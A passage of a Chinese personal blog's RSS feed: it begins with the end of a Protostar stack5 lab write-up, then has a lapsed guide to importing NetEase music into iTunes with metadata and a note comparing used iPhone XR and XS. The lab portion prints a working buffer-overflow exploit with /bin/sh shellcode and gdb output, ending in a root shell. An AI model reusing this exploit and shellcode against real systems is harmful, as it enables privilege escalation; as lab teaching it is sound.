&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; x/24wx $esp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xbffff79c:	0xb7eadc76	0x00000001	0xbffff844	0xbffff84c
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xbffff7ac:	0xb7fe1848	0xbffff800	0xffffffff	0xb7ffeff4
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xbffff7bc:	0x08048232	0x00000001	0xbffff800	0xb7ff0626
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xbffff7cc:	0xb7fffab0	0xb7fe1b28	0xb7fd7ff4	0x00000000
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xbffff7dc:	0x00000000	0xbffff818	0xf982f58c	0xd3d5c39c
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xbffff7ec:	0x00000000	0x00000000	0x00000000	0x00000001
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;随便选一个&amp;hellip;比如 &lt;code&gt;0xbffff7dc&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# stack5.py&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; struct
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;padding &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;return_address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; struct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;I&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xbffff7dc&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x90&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;int3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xCC\xCC\xCC\xCC&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print (padding &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; return_address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; nop &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; int3)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 接下来 python stack5.py &amp;gt; st5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; r &amp;lt; st5
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting program: /opt/protostar/bin/stack5 &amp;lt; st5
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Program received signal SIGTRAP, Trace/breakpoint trap.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xbffff8cd in ?? &lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;Program received signal SIGTRAP, Trace/breakpoint trap.&lt;/code&gt; 看起来是成功了&lt;/p&gt;
&lt;p&gt;接下来把 shellcode 也加进去吧，就用最开头的那个&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# stack5.py&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; struct
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;padding &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;return_address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; struct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;I&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xbffff7dc&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x90&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;int3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xCC\xCC\xCC\xCC&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;shellcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/tty&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/dev&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;//sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/bin\x&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt;\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 注意这里把 int3 去掉了&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print (padding &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; return_address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; nop &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; shellcode)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ python stack5.py | /opt/protostar/bin/stack5
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# whoami&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;完成w&lt;/p&gt;
&lt;hr /&gt;
</description>
        </item>
        <item>
        <title>【已失效】关于网易云的音乐如何保留完整 Meta 信息着导入 iTunes</title>
        <link>/p/netease-to-itunes/</link>
        <pubDate>Fri, 20 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>/p/netease-to-itunes/</guid>
        <description>&lt;img src="/p/netease-to-itunes/cover.png" alt="Featured image of post 【已失效】关于网易云的音乐如何保留完整 Meta 信息着导入 iTunes" /&gt;&lt;p style=&#34;font-size: xx-large; color: red&#34;&gt;！失效了 ！&lt;/p&gt;
&lt;p&gt;&lt;del&gt;有人发现上面这个是在模仿黑魂一的「中毒了」提示么x&lt;/del&gt;&lt;/p&gt;
&lt;h2 id=&#34;选项-1&#34;&gt;选项 #1&lt;/h2&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 307; flex-basis: 738px&#34;&gt;
		&lt;a href=&#34;/p/netease-to-itunes/zl.png&#34; data-size=&#34;1022x332&#34;&gt;&lt;img src=&#34;/p/netease-to-itunes/zl.png&#34;
				srcset=&#34;/p/netease-to-itunes/zl_hu2605f7712547763fba3138bbcb68fa57_46309_480x0_resize_box_3.png 480w, /p/netease-to-itunes/zl_hu2605f7712547763fba3138bbcb68fa57_46309_1024x0_resize_box_3.png 1024w&#34;
				width=&#34;1022&#34;
				height=&#34;332&#34;
				loading=&#34;lazy&#34;
				&gt;
		&lt;/a&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;选项-2&#34;&gt;选项 #2&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mp3.aoleiao.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;mp3.aoleiao.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;叹气气 总之以后就方便多了&lt;/p&gt;
&lt;p&gt;这篇还是姑且留在这里吧..&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;首先的话..姑且先是常规操作&lt;/p&gt;
&lt;h1 id=&#34;基操&#34;&gt;基操&lt;/h1&gt;
&lt;h2 id=&#34;mac-上的格式转换软件&#34;&gt;Mac 上的格式转换软件&lt;/h2&gt;
&lt;p&gt;这里只推荐 XLD，真的yyds（&lt;/p&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 88; flex-basis: 212px&#34;&gt;
		&lt;a href=&#34;/p/netease-to-itunes/xld.png&#34; data-size=&#34;792x896&#34;&gt;&lt;img src=&#34;/p/netease-to-itunes/xld.png&#34;
				srcset=&#34;/p/netease-to-itunes/xld_huf9bf5e75a4792267e6b1853aa309c281_315647_480x0_resize_box_3.png 480w, /p/netease-to-itunes/xld_huf9bf5e75a4792267e6b1853aa309c281_315647_1024x0_resize_box_3.png 1024w&#34;
				width=&#34;792&#34;
				height=&#34;896&#34;
				loading=&#34;lazy&#34;
				alt=&#34;XLD&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;XLD&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;免费功能还多还方便&lt;/p&gt;
&lt;p&gt;顺带一提：
很重要的一件事情就是 iTunes 不认识 Flac 的所以建议全部导出成 Apple Loseless&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;网易云私有格式-ncm--flac--mp3&#34;&gt;网易云私有格式 NCM → FLAC / MP3&lt;/h2&gt;
&lt;p&gt;这里的话..直接用 &lt;a class=&#34;link&#34; href=&#34;https://ncm.worthsee.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这个 ncm.worthsee.com&lt;/a&gt; 就能全部转换&lt;/p&gt;
&lt;p&gt;唯一的问题是，至少在 Safari 上的「批量下载」是会有遗漏的&amp;hellip;所以还是一首一首点比较好&lt;/p&gt;
&lt;p&gt;坑：&lt;/p&gt;
&lt;p&gt;很离谱，&lt;code&gt;转换出来如果是 Flac 的话所有的 Meta 信息都会丢失..&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;封面艺术家专辑名之类的全部没了x 草&lt;/p&gt;
&lt;p&gt;&amp;hellip;总之请继续往后看吧&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;mac-上的-meta-信息编辑软件&#34;&gt;Mac 上的 Meta 信息编辑软件&lt;/h2&gt;
&lt;p&gt;推荐软件：就叫「META」&lt;/p&gt;
&lt;p&gt;可以批量编辑，也可以搜索 iTunes Store 的专辑封面帮你填充上去&lt;/p&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 163; flex-basis: 392px&#34;&gt;
		&lt;a href=&#34;/p/netease-to-itunes/meta.png&#34; data-size=&#34;2190x1340&#34;&gt;&lt;img src=&#34;/p/netease-to-itunes/meta.png&#34;
				srcset=&#34;/p/netease-to-itunes/meta_hu6e075eb7c6b9b4fde72cb053c09f55e5_1459190_480x0_resize_box_3.png 480w, /p/netease-to-itunes/meta_hu6e075eb7c6b9b4fde72cb053c09f55e5_1459190_1024x0_resize_box_3.png 1024w&#34;
				width=&#34;2190&#34;
				height=&#34;1340&#34;
				loading=&#34;lazy&#34;
				alt=&#34;Meta&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;Meta&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h1 id=&#34;进阶&#34;&gt;进阶&lt;/h1&gt;
&lt;h2 id=&#34;关于因为-ncm--flac-所造成的-meta-信息丢失的批量解决办法&#34;&gt;关于因为 NCM → FLAC 所造成的 Meta 信息丢失的「批量」解决办法&lt;/h2&gt;
&lt;p&gt;姑且有以下解决办法：&lt;/p&gt;
&lt;h3 id=&#34;1-网易云音乐设置下载音质无损&#34;&gt;1. 网易云音乐，设置下载音质：无损&lt;/h3&gt;
&lt;p&gt;这一步是为了获取无损音源&lt;/p&gt;
&lt;h3 id=&#34;2-将这个播放列表下载下来放到文件夹a中&#34;&gt;2. 将这个播放列表下载下来，放到文件夹A中&lt;/h3&gt;
&lt;p&gt;姑且先把文件夹命名为「META 信息丢失 TMP」&lt;/p&gt;
&lt;p&gt;这里即将要存的都是 &lt;code&gt;「无损、但丢 Meta 信息了的」&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;3-使用上述的那个网站将-ncm--flac--mp3&#34;&gt;3. 使用上述的那个网站将 NCM → FLAC / MP3&lt;/h3&gt;
&lt;p&gt;这时候就会出现 NCM → FLAC 时候的 Meta 信息丢失了&lt;/p&gt;
&lt;p&gt;不过问题不大x&lt;/p&gt;
&lt;h3 id=&#34;4-再使用-xld-将-flac--apple-loseless&#34;&gt;4. 再使用 XLD 将 FLAC → Apple Loseless&lt;/h3&gt;
&lt;p&gt;毕竟 iTunes 不认识 Flac 的&lt;/p&gt;
&lt;h3 id=&#34;5-网易云音乐设置下载音质极高&#34;&gt;5. 网易云音乐，设置下载音质：极高&lt;/h3&gt;
&lt;p&gt;这一步主要还是为了获得 Meta 信息完整的歌曲&lt;/p&gt;
&lt;p&gt;再说一遍、无损和 Meta 信息不能共存的原因就是第三步那个网站转换 Flac 的话会把 Meta 弄丢&lt;/p&gt;
&lt;h3 id=&#34;6-将这个播放列表下载下来放到文件夹b中&#34;&gt;6. 将这个播放列表下载下来，放到文件夹B中&lt;/h3&gt;
&lt;p&gt;姑且先把文件夹命名为「META 信息备份 TMP」&lt;/p&gt;
&lt;p&gt;这里即将要存的都是 &lt;code&gt;「有损、但也有 Meta 信息的」&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;7-使用上述的那个网站将-ncm--mp3&#34;&gt;7. 使用上述的那个网站将 NCM → MP3&lt;/h3&gt;
&lt;p&gt;这次因为没有 Flac 的所以全部歌曲的 Meta 都能保留&lt;/p&gt;
&lt;h3 id=&#34;8-建立文件夹-tmp先把文件夹a的内容扔进去&#34;&gt;8. 建立文件夹 TMP，先把文件夹A的内容扔进去&lt;/h3&gt;
&lt;p&gt;TMP 此时内含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Meta 信息丢失了的 Apple Loseless 文件&lt;/li&gt;
&lt;li&gt;或许本来就没有无损版本的，Meta 信息完整的 MP3 文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;9-再把文件夹b的内容扔进去&#34;&gt;9. 再把文件夹B的内容扔进去&lt;/h3&gt;
&lt;p&gt;此时，B重的 MP3 文件会覆盖A的，
但是介于它们都是 Meta 信息完整的 MP3 所以没什么好担心的&lt;/p&gt;
&lt;p&gt;TMP 此时内含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Meta 信息丢失了的 Apple Loseless 文件&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;与 &lt;code&gt;Meta 信息丢失了的 Apple Loseless 文件&lt;/code&gt;文件名相同的 &lt;code&gt;Meta 信息完整的 MP3 文件&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;或许本来就没有无损版本的，Meta 信息完整的 MP3 文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;10-全部扔到-meta-编辑器里去接着以文件名排序&#34;&gt;10. 全部扔到 Meta 编辑器里去，接着以文件名排序&lt;/h3&gt;
&lt;p&gt;这时候你会发现这样的情况：&lt;/p&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 569; flex-basis: 1366px&#34;&gt;
		&lt;a href=&#34;/p/netease-to-itunes/meta2.png&#34; data-size=&#34;1036x182&#34;&gt;&lt;img src=&#34;/p/netease-to-itunes/meta2.png&#34;
				srcset=&#34;/p/netease-to-itunes/meta2_hu79157e6365458bc4b77610abc34220ce_82777_480x0_resize_box_3.png 480w, /p/netease-to-itunes/meta2_hu79157e6365458bc4b77610abc34220ce_82777_1024x0_resize_box_3.png 1024w&#34;
				width=&#34;1036&#34;
				height=&#34;182&#34;
				loading=&#34;lazy&#34;
				alt=&#34;丢失了 Meta 的无损 和 还有 Meta 的有损 放在一起的样子&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;丢失了 Meta 的无损 和 还有 Meta 的有损 放在一起的样子&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;很显然第一首是没有 Meta 信息的&lt;/p&gt;
&lt;p&gt;这时候 Meta 编辑器给了乃一个神仙功能————&lt;/p&gt;
&lt;h3 id=&#34;11-meta-信息拷贝粘贴&#34;&gt;11. Meta 信息：拷贝&amp;amp;粘贴&lt;/h3&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 78; flex-basis: 188px&#34;&gt;
		&lt;a href=&#34;/p/netease-to-itunes/metaCP.png&#34; data-size=&#34;492x628&#34;&gt;&lt;img src=&#34;/p/netease-to-itunes/metaCP.png&#34;
				srcset=&#34;/p/netease-to-itunes/metaCP_hudcd9b7003712ac0986aeba9c23075162_250920_480x0_resize_box_3.png 480w, /p/netease-to-itunes/metaCP_hudcd9b7003712ac0986aeba9c23075162_250920_1024x0_resize_box_3.png 1024w&#34;
				width=&#34;492&#34;
				height=&#34;628&#34;
				loading=&#34;lazy&#34;
				alt=&#34;右键示例&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;右键示例&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;就这么简单..一首一首拷贝&amp;amp;粘贴 Meta 信息&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;什么你还觉得麻烦..?!&lt;/p&gt;
&lt;p&gt;那你来找出更好的解决方案啊（（&lt;/p&gt;
&lt;p&gt;至少比起一首一首查搜索引擎来补全 Meta 信息好多了&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;12-删除重复文件&#34;&gt;12. 删除重复文件&lt;/h3&gt;
&lt;p&gt;在文件管理器中按照文件名排序&lt;/p&gt;
&lt;p&gt;然后把所有&lt;code&gt;文件名重复&lt;/code&gt;中&lt;code&gt;后缀是 MP3&lt;/code&gt; 的那个删掉&lt;/p&gt;
&lt;h3 id=&#34;13-end直接扔进-itunes&#34;&gt;13. End，直接扔进 iTunes&lt;/h3&gt;
&lt;p&gt;终于结束了&amp;hellip;&lt;/p&gt;
&lt;p&gt;好诶&amp;hellip;&lt;/p&gt;
&lt;h1 id=&#34;总结&#34;&gt;总结&lt;/h1&gt;
&lt;p&gt;所以说..是不是如果 NCM → Flac 不丢 Meta 信息的话就不用管这些了啊&amp;hellip;&lt;/p&gt;
&lt;p&gt;或者乃对无损没有追求的话&lt;/p&gt;
&lt;p&gt;草！&lt;/p&gt;
&lt;p&gt;其实咱挺木耳的、但是还是想姑且让音乐库里尽量是无损Ver（&lt;/p&gt;
&lt;p&gt;而且网易云确实太花里胡哨了、虽然一起听歌功能很好玩&amp;hellip;&lt;/p&gt;
&lt;p&gt;还有一点咱其实是 iPod 用户而且 iTunes 里面真的上千首歌曲的时候管理起来超级方便wwww&lt;/p&gt;
&lt;p&gt;特别是智能播放列表这些太棒了ww&lt;/p&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 88; flex-basis: 212px&#34;&gt;
		&lt;a href=&#34;/p/netease-to-itunes/auto.png&#34; data-size=&#34;1466x1658&#34;&gt;&lt;img src=&#34;/p/netease-to-itunes/auto.png&#34;
				srcset=&#34;/p/netease-to-itunes/auto_hu71eb15816155df4672cdca1cf12dbed0_899800_480x0_resize_box_3.png 480w, /p/netease-to-itunes/auto_hu71eb15816155df4672cdca1cf12dbed0_899800_1024x0_resize_box_3.png 1024w&#34;
				width=&#34;1466&#34;
				height=&#34;1658&#34;
				loading=&#34;lazy&#34;
				alt=&#34;智能播放列表支持的规则、没截图全&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;智能播放列表支持的规则、没截图全&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;总之就写这些了&amp;hellip;瘫x&lt;/p&gt;
</description>
        </item>
        <item>
        <title>关于 2021 年捡垃圾是选 XR 还是 XS 的笔记</title>
        <link>/p/2021-ip-xr-or-xs/</link>
        <pubDate>Tue, 27 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>/p/2021-ip-xr-or-xs/</guid>
        <description>&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;还是选 iPhone 是因为咱是 iCloud 的重度用户而且和 Mac 结合非常方便&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;因为只是「笔记」所以本文充满了我的偏见与独断x&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;截止目前&lt;code&gt;2021.7.27&lt;/code&gt;，同样是二手、国行、九新+、256G&lt;br&gt;
XR 和 XS 的价格都在 2500 左右，&lt;br&gt;
且 XR 会稍微便宜一点（也就在两三百左右&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;接下来记录一下自己查资料时的一些思路&lt;/p&gt;
&lt;hr /&gt;
&lt;h1 id=&#34;外观--手感&#34;&gt;外观 &amp;amp; 手感&lt;/h1&gt;
&lt;p&gt;不得不说我感觉 XR 的单摄像头好好看啊啊啊啊&lt;/p&gt;
&lt;p&gt;而且花里胡哨的颜色&lt;/p&gt;
&lt;p&gt;但好像很多人对 XR 的边框很不满&lt;/p&gt;
&lt;p&gt;但我平常是看屏幕不是看边框啊喂，停航母边框又咋样、反正我也不戴tao——&lt;/p&gt;
&lt;p&gt;* 看了下自己背面全是坑正面玻璃全碎的 6S&lt;/p&gt;
&lt;p&gt;我觉得可能还是戴套比较好。&lt;/p&gt;
&lt;p&gt;顺便因为 XR 还挺厚，&lt;/p&gt;
&lt;p&gt;所以至少 XS 戴套的话正面无论看起来还是操作起来都会优于 XR 的吧&lt;/p&gt;
&lt;p&gt;（话说上一句话不应该是归类于&lt;code&gt;#屏幕&lt;/code&gt;节么x&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;所以对我来说的话，&lt;/p&gt;
&lt;p&gt;如果都戴套：&lt;/p&gt;
&lt;p&gt;手感：XS &amp;gt; XR&lt;/p&gt;
&lt;p&gt;外观：半斤八两，虽然 XS 赢了正面但背面果然还是 XR 好看&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1 id=&#34;续航&#34;&gt;续航&lt;/h1&gt;
&lt;p&gt;毕竟这个 6S 已经&amp;hellip;2015 年发布到现在已经 6 年了所以电池实在是&amp;hellip;&lt;/p&gt;
